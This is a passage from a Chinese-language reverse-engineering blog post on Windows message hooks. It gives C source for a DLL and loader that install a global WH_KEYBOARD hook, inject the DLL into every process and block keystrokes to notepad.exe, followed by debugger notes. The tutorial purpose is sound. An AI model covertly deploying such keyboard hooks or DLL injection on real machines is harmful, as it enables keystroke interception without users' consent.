comment">//若非notepad.exe,则调用CallNextHookEx()函数，消息将传递给下一个程序</span><span class="token comment">//_stricmp()函数用于比较字符串，i表示不区分大小写，若两个值相等则返回0</span><span class="token keyword">return</span> <span class="token function">CallNextHookEx</span><span class="token punctuation">(</span>g_hHook<span class="token punctuation">,</span> nCode<span class="token punctuation">,</span> wParam<span class="token punctuation">,</span> lParam<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__cplusplus</span></span><span class="token keyword">extern</span> <span class="token string">"C"</span> <span class="token punctuation">{</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">HookStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>g_hHook <span class="token operator">=</span> <span class="token function">SetWindowsHookEx</span><span class="token punctuation">(</span>WH_KEYBOARD<span class="token punctuation">,</span> KeyboardProc<span class="token punctuation">,</span> g_hInstance<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">HookStop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>g_hHook<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">UnhookWindowsHookEx</span><span class="token punctuation">(</span>g_hHook<span class="token punctuation">)</span><span class="token punctuation">;</span>g_hHook <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__cplusplus</span></span><span class="token punctuation">}</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装好键盘钩子，无论什么进程，只要键盘输入事件，OS就会强行将KeyHook.dll注入进程，加载了KeyHook.dll的进程中，发生键盘事件时会首先调用执行KeyHook.KeyboardProc()</p><p>KeyHook.KeyboardProc()函数中发生键盘输入事件时，会比较进程的名字是否与notepad.exe相同，相同返回1，终止KeyHook.KeyboardProc()函数，截获且删除信息，键盘消息就不会传递到notepad.exe程序的消息队列中。</p><h3 id="HookMain-cpp"><a href="#HookMain-cpp" class="headerlink" title="HookMain.cpp"></a>HookMain.cpp</h3><p>调用导出函数HookStrat()时，SetWindowsHookEx()函数会将KeybroadProc()添加到键盘钩链</p><h4 id="KeybroadProc-函数定义"><a href="#KeybroadProc-函数定义" class="headerlink" title="KeybroadProc()函数定义"></a>KeybroadProc()函数定义</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">LRESULT CALLBACK <span class="token function">KeyboardProc</span><span class="token punctuation">(</span>    <span class="token keyword">int</span> code<span class="token punctuation">,</span>           <span class="token comment">//HC_ACTION(0), HC_NOREMOVE(3)</span>    WPARAM wParam<span class="token punctuation">,</span>      <span class="token comment">//virtual-key code</span>    LPARAM lParam       <span class="token comment">//extra information</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//wParam是按下键盘按键的虚拟键值</span><span class="token comment">//使用ToAscii()API函数可以获得实际按下键盘的ASCII值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先加载KeyHook.DLL文件，然后调用HookStart()函数钩取输入q时，调用HookStop()函数终止钩取。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"stdio.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"conio.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"windows.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span><span class="token macro-name">DEF_DLL_NAME</span><span class="token string">"KeyHook.dll"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span><span class="token macro-name">DEF_HOOKSTART</span><span class="token string">"HookStart"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span><span class="token macro-name">DEF_HOOKSTOP</span><span class="token string">"HookStop"</span></span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>PFN_HOOKSTART<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>PFN_HOOKSTOP<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>HMODULEhDll <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>PFN_HOOKSTARTHookStart <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>PFN_HOOKSTOPHookStop <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">char</span>ch <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 加载KeyHook.dll </span>hDll <span class="token operator">=</span> <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span>DEF_DLL_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> hDll <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"LoadLibrary(%s) failed!!! [%d]"</span><span class="token punctuation">,</span> DEF_DLL_NAME<span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 获取导出函数地址 </span>HookStart <span class="token operator">=</span> <span class="token punctuation">(</span>PFN_HOOKSTART<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hDll<span class="token punctuation">,</span> DEF_HOOKSTART<span class="token punctuation">)</span><span class="token punctuation">;</span>HookStop <span class="token operator">=</span> <span class="token punctuation">(</span>PFN_HOOKSTOP<span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>hDll<span class="token punctuation">,</span> DEF_HOOKSTOP<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 开始钩取 </span><span class="token function">HookStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 等待用户输入“q” </span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"press 'q' to quit!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token function">_getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'q'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 终止钩取 </span><span class="token function">HookStop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 卸载KeyHook.dll </span><span class="token function">FreeLibrary</span><span class="token punctuation">(</span>hDll<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行HookMain.exe可安装键盘钩子</p><p><img src="/2019/08/22/windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/image-20250921174648430.png"></p><p>输入q可停止键盘钩取</p><h3 id="调试HookMain-exe"><a href="#调试HookMain-exe" class="headerlink" title="调试HookMain.exe"></a>调试HookMain.exe</h3><p>通过字符串检索找到main函数</p><p><img src="/2019/08/22/windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/image-20250921174705475.png"></p><p>程序在00C2140E地址处调用LoadLibraryA(KeyHook.dll)</p><p>调用了SetWindowsHookExW()函数时，先有两条PUSH指令将该函数的第一、第二两个参数压入栈。其中第一个参数idHook值为2，即WH_KEYBOARD，第二个参数lpfn值为为钩子过程的地址。</p><pre class="line-numbers language-none"><code class="language-none">调试notepad.exe进程中的KeyHook.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行notpead.exe后弹出Executable modules窗口，KeyHook.dll已被加载</p><p><strong>操作过程</strong></p><p><img src="/2019/08/22/windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96/image-20250921174725066.png"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hook </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
